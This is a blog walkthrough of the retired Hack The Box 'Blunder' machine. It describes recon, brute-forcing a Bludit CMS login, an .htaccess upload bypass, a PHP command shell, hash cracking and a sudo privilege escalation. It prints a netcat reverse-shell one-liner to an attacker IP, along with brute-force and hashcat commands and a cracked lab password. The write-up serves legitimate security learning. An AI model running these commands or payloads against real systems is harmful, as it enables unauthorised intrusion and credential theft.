---
id: 229
title: 'Writeup - Hack The Box Blunder'
date: '2020-10-30T19:25:21+00:00'
author: Lukas Lichtl
layout: post
guid: 'https://embed-me.github.io/?p=229'
permalink: /htb-blunder/
wp_featherlight_disable:
    - ''
categories:
    - 'Hack the Box'
    - 'Penetration Testing'
tags:
    - Blunder
    - 'Hack The Box'
    - HTB
    - 'Penetration Testing'
    - Pentesting
---

## Intro

![_config.yml]({{ site.baseurl }}/images/htb_blunder/blunder.png)

The following post will describe how I hacked the previously retired Blunder Box. However, I am not an experienced Pentester, therefore take everything I say with a grain of salt. Now let’s have some fun with this nice Linux Box.

## Setup

As usual add the box to the */etc/hosts* file. This makes our lives easier, since we do not need to remember the IP-Address.

![_config.yml]({{ site.baseurl }}/images/htb_blunder/hosts_file.png)

## Recon

In order to discover potential attack vectors, we have to enumerate the target using nmap.

![_config.yml]({{ site.baseurl }}/images/htb_blunder/nmap.png)

Apache webserver is running on port 80 and we are able to visit the website hosted on the machine using an ordinary browser. After playing around a little bit – there is not a lot that can be done – it looks like a minimalistic blog.

![_config.yml]({{ site.baseurl }}/images/htb_blunder/blog.png)

In order to find out if there are any directories or files on the webserver which are not linked we can make use of [gobuster](https://tools.kali.org/web-applications/gobuster). There are many other alternatives, even tools that provide a GUI (eg.: [dirbuster](https://tools.kali.org/web-applications/dirbuster)).

Just a few seconds later, we already found a some interesting files.

![_config.yml]({{ site.baseurl }}/images/htb_blunder/gobuster.png)

Implementing REP (Robots-Exclusion-Standard-Protocol), *robots.txt* is also often a source of hidden paths which might not be covered by an ordinary wordlist, however, in this case it is useless as it contains nothing.

![_config.yml]({{ site.baseurl }}/images/htb_blunder/robots.png)

The only really useful information that I was able to fetch was the username “*fergus*” from within a text file called *todo.txt*.

![_config.yml]({{ site.baseurl }}/images/htb_blunder/fergus_user.png)

The CMS used is called [Bludit ](https://github.com/bludit/bludit)and with a closer look at the sites html header, the exact version (**3.9.2**) can be determined.

![_config.yml]({{ site.baseurl }}/images/htb_blunder/bludit_version.png)

Now that we have all the information that we can get (at least for now), it is time to find vulnerabilities. After the last step, we know some of the specifics of the CMS and [exploit-db](https://www.exploit-db.com) offers some usable results.

![_config.yml]({{ site.baseurl }}/images/htb_blunder/bludit_vulnerabilities.png)

Let’s use the available python script to bruteforce the passwords. Seems like it simply parses the CSRF token from the HTML, passes it in the request header and finally issues the login request with the provided username and password. In order to check if the login was successful the script checks for “*/admin/dashboard*“. The most promising usernames are probably *“admin*” and “*fergust*“. In order to guess the password *rockyou.txt* can be worth a shot.

``` bash
python3 blunder_bf.py -l http://htb.blunder/admin/login.php -p /usr/share/wordlists/rockyou.txt -u users.txt
```

![_config.yml]({{ site.baseurl }}/images/htb_blunder/brute_force_1.png)

However, I had to give up after some time since I was not able to find a working combination. The password has to be somewhere on the webpage. Let’s try the wordlist generator [cewl](https://tools.kali.org/password-attacks/cewl) to generate a password-list with the content of the page and repeat the above process.

``` bash
cewl http://htb.blunder > passwords.txt
```

``` bash
python3 blunder_bf.py -l http://htb.blunder/admin/login.php -p passwords.txt -u users.txt
```

![_config.yml]({{ site.baseurl }}/images/htb_blunder/brute_force_2.png)

Finally success, we have the credentials and we can login as user “*fergus*“.

![_config.yml]({{ site.baseurl }}/images/htb_blunder/admin_dashboard.png)

Using the browser again, we are in the admin dashboard. Btw, I really like the “visits curve” ;-).

There is not a lot we can do due to missing permissions, however, it seems like we are able to post and upload files. Interesting!, especially because there was a path traversal attack in the exploit database.

![_config.yml]({{ site.baseurl }}/images/htb_blunder/fileupload_filter.png)

After playing a round a little bit, it seems like there are two checks in the code. First, before uploading – in the browser – and also later on the backend. Selecting a file with the file-ending .gif and altering the request won’t work. Uploading a file with the allowed file endings makes no sense, since then they won’t be executed. Also the file endings provided do not look promising for any attack that I am aware of (except maybe XSS for the svg, but that does not help right now). What if the backend verifies the file header, not the file-ending. I ended up downloading a random GIF file from google to read the files magic header. Btw, there is also a huge database available online: [https://www.garykessler.net/library/file\_sigs.html](https://www.garykessler.net/library/file_sigs.html)

![_config.yml]({{ site.baseurl }}/images/htb_blunder/gif_header.png)

I tried to add the magic header in front of the php code, however, was not able to trick the server into accepting the file.

After almost giving up, I stumbled upon the following issue in git: <https://github.com/bludit/bludit/issues/1081>  
The trick of the exploit was to upload a “*.htaccess*” file which switches off the RewriteEngine (<https://httpd.apache.org/docs/current/howto/htaccess.html>). The following lines show the corresponding request.

![_config.yml]({{ site.baseurl }}/images/htb_blunder/exploit_1.png)

After that we are able to upload the “*expoit.php*” file as follows. It will execute commands provided with the “q” parameter. This allows for more flexibility to structure the reverse shell code.

![_config.yml]({{ site.baseurl }}/images/htb_blunder/exploit.png)

I ended up using the following reverse shell.

``` bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.41 4444 >/tmp/f
```

As soon as the payload executed, the attack machines listener got the connection to the target.

![_config.yml]({{ site.baseurl }}/images/htb_blunder/reverse_shell_listener.png)

Poking around a little, I figured that reading the “*user.txt*” flag was not possible since the process was running as “*www-data*” user. We have to perform privilege escalation in order to get to the flag.

![_config.yml]({{ site.baseurl }}/images/htb_blunder/www-data_user.png)

On the target machine, the following path looked promising. A “*users.php*” file was present, in it two hashes for the “*admin”* and the “*hugo”* users. Both salted, however.

``` bash
/var/www/bludit-3.9.2/bl-content/databases
```

I had to try my luck on the admin user credentials, so I identified the hash using [hash-identifier](https://tools.kali.org/password-attacks/hash-identifier).

![_config.yml]({{ site.baseurl }}/images/htb_blunder/hash_identifier.png)

Looking through the source code of Bludit in github, indeed, the password is for this version is of the form *sha1(password.salt)*:

![_config.yml]({{ site.baseurl }}/images/htb_blunder/hash_git.png)

However, due to the salted password, it is not possible to use a rainbow table… I tried to crack it using [hashcat](https://tools.kali.org/password-attacks/hashcat), but after some time I had to give up.

``` bash
hashcat --hex-salt --hash-type 110 -a 3 admin.hash /usr/share/wordlists/rockyou.txt
```

Back on the Blunder Box, I found another path to a updated newer version of Bludit that I previously missed.

``` bash
/var/www/bludit-3.10.0a/bl-content/databases
```

It also contains a hash, however it seems like no salt is used. Therefore rainbowtables can be used!

![_config.yml]({{ site.baseurl }}/images/htb_blunder/hash_without_salt.png)

Using [CrackStation](https://crackstation.net/) I was able to crack the hash in a matter of seconds. The credentials are “*hugo:Password120*“.

![_config.yml]({{ site.baseurl }}/images/htb_blunder/hugo_user.png)

Aaaaaaaand we are able to grab the first flag in user.txt!

``` bash
90c8********************7f0d
```

## Getting root

However, our current user “*hugo”* cannot make use of sudo and does not have permissions to grab the *root.txt* file.

![_config.yml]({{ site.baseurl }}/images/htb_blunder/sudo_version.png)

Googling for sudo 1.8.25p1 led me to the following exploit on [exploit-db](https://www.exploit-db.com/exploits/47502) (again).

In order for the attack to work, I had to spawning a TTY Shell using python.

``` bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

After that I was able to exploit the vulnerability mentioned above in order to get root!

![_config.yml]({{ site.baseurl }}/images/htb_blunder/privilage_escalation_root.png)

Finally, the last flag in */root/root.txt* can be grabbed. ***S******uccess!***

``` bash
5495********************cf40
```

This box really was fun, and for me as a beginner, the challenge was quite hard to be honest. However, finishing a box is always a nice experience and you definitely get better and better every time.